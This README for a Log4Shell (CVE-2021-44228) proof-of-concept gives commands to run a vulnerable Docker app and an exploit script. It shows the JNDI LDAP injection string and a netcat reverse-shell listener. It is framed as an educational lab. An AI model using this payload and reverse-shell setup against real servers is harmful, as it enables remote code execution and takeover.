A Proof-Of-Concept for the recently found CVE-2021-44228 vulnerability. <br><br>

Recently there was a new vulnerability in log4j, a java logging library that is very widely used in the likes of elasticsearch, minecraft and numerous others.

In this repository we have seen how to exploit log4j vulnerability with a simple vulnerable application

You can download the POC and its dependency files from [here](https://drive.google.com/drive/folders/1gpNdCJnvYI0qjVJMeOFkfd_i3NCujTPT).

#### Usage:

* Step #1 : Clone & Download the Vulnerable application from above.<br>
* Step #2 : Install Docker and run the following commands to host a vulnerable application. <br>

    ```c
    1: # docker build -t log4j-shell-poc .
    2: # docker run --network host log4j-shell-poc
    ```
    Once it is running, you can access it on localhost:8080

    <br>

* Step #3 : Download and extract the POC folder from above link and install it dependencies.<br>

    ```py
    $ tar -xvf jdk-8u20-linux-x64.tar.gz
    $ pip3 install -r requirements.txt
    $ python3 poc.py --userip localhost --webport 8000 --lport 4545

    [!] CVE: CVE-2021-44228

    [!] Github repo: https://github.com/Hack-with-8k0b/log4j-App-and-Poc

    [+] Exploit java class created success
    [+] Setting up fake LDAP server

    [+] Send me: ${jndi:ldap://localhost:1389/a}

    Listening on 0.0.0.0:1389
    ```
    
* Step #4 : Start a netcat listener in different terminal to accept reverse shell connection.<br>
```py
nc -lvnp 4545
```
* Step #5 : Copy & paste the link created by the poc into the vulnerable input field .<br>

    This script will setup the HTTP server and the LDAP server for you, and it will also create the payload that you can use to paste into the vulnerable parameter. After this, if everything went well, you should get a shell on the lport.

<br>


Disclaimer
----------
The above POC and Vulnerable App is simplified version of kozmer's Github log4jshell-poc, This POC is for educational purposes only, so use it on your own risks.

This is to help security researchers and newbies to learn about log4jshell vulnerablity and attack, for any concerns and queries feel free to reach me out @ nbharathkumara@gmail.com
